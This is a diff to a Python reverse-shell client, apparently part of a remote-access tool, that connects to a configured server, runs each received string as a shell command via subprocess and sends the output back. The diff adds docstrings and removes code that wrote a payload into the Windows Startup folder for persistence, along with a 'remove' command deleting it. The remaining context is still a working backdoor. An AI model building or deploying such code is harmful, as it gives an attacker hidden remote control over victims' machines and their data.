@@ -26,10 +26,12 @@ class Client(object):
                 self.socket.close()
             except Exception as e:
                 print('')
+                # continue
         sys.exit(0)
         return
 
     def socket_create(self):
+        """ Create a socket """
         try:
             self.socket = socket.socket()
         except socket.error as e:
@@ -38,6 +40,7 @@ class Client(object):
         return
 
     def socket_connect(self):
+        """ Connect to a remote socket """
         try:
             self.socket.connect((self.serverHost, self.serverPort))
         except socket.error as e:
@@ -52,11 +55,13 @@ class Client(object):
         return
 
     def print_output(self, output_str):
+        """ Prints command output """
         sent_message = str.encode(output_str + str(os.getcwd()) + '> ')
         self.socket.send(struct.pack('>I', len(sent_message)) + sent_message)
         return
 
     def receive_commands(self):
+        """ Receive commands from remote server and run on local machine """
         try:
             self.socket.recv(10)
         except Exception as e:
@@ -79,12 +84,6 @@ class Client(object):
             elif data[:].decode("utf-8") == 'quit':
                 self.socket.close()
                 break
-            elif data[:].decode("utf-8") == 'remove':
-                user = os.getlogin()
-                target = "C:/Users/%s/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/python.pyw"%user
-                os.remove(target)
-                exit()
-                break
             elif len(data) > 0:
                 try:
                     cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,
@@ -92,6 +91,7 @@ class Client(object):
                     output_bytes = cmd.stdout.read() + cmd.stderr.read()
                     output_str = output_bytes.decode("utf-8", errors="replace")
                 except Exception as e:
+                    # TODO: Error description is lost
                     output_str = "Command execution unsuccessful: %s\n" %str(e)
             if output_str is not None:
                 try:
@@ -101,18 +101,7 @@ class Client(object):
         self.socket.close()
         return
 
-#CHANGE_THIS
-#Payload in payload.txt
-#Payload as hex: "\x9f\x23\" etc 
-#payload = str.encode("HERE")
-payload = str.encode("")
-
 def main():
-    user = os.getlogin()
-    target = "C:/Users/%s/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/Python.pyw"%user
-    f = open(target, 'wb')
-    f.write(payload)
-    f.close()
     client = Client()
     client.register_signal_handler()
     client.socket_create()
@@ -129,6 +118,7 @@ def main():
         print('')
     client.socket.close()
     return
+
 
 if __name__ == '__main__':
     while True:
